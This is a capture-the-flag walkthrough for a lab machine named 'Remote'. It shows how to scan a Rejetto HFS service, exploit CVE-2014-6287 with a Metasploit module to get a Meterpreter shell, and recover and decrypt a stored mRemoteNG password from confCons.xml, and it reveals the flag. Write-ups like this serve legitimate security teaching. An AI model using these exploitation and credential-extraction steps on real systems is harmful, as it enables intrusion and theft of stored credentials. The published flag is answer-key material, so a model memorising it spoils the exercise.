# Remote

## Challenge

> Get the highest privilege on the machine and find the flag!

**Hint:** Port `1337` is open.

---

## Walkthrough

### 1. Enumerating the exposed service

Begin with the port identified in the challenge hint:

```bash
nmap <TARGET_IP> -p 1337 -T5 -sV
```

The scan identifies a vulnerable version of **Rejetto HTTP File Server (HFS)** associated with **CVE-2014-6287**.

### 2. Accessing the machine

Use Metasploit's HFS exploit module:

```text
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
set RPORT 1337
run
```

The exploit opens a Meterpreter session on the target.

### 3. Investigating mRemoteNG

Further investigation reveals an installation of **mRemoteNG** in the following directory:

```text
C:\Program Files (x86)\mRemoteNG
```

The writeup identifies **CVE-2020-24307**, which concerns how stored mRemoteNG connection credentials can be exposed to a user with access to the configuration file.

The relevant configuration location is:

```text
C:\Users\<Username>\AppData\Roaming\mRemoteNG\confCons.xml
```

A stored encrypted password is recovered from the configuration:

```text
UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw==
```

### 4. Decrypting the stored password

Use the [mRemoteNG decryption script](https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py) to decode the stored credential:

```bash
chmod +x mremoteng_decrypt.py
./mremoteng_decrypt.py -s 'UrEP/swCis5pretwdL/frrCaV5c6P4mPz2RcKr91qJAj1yiMtMUg5zrbxH6gyqoMQZSs0HIbPn/K6mx3rkvjBXYaXw=='
```

---

<details>
<summary><strong>🚩 Reveal Flag</strong></summary>

```text
aw3s0m3_r3m0te_fl4g
```

</details>
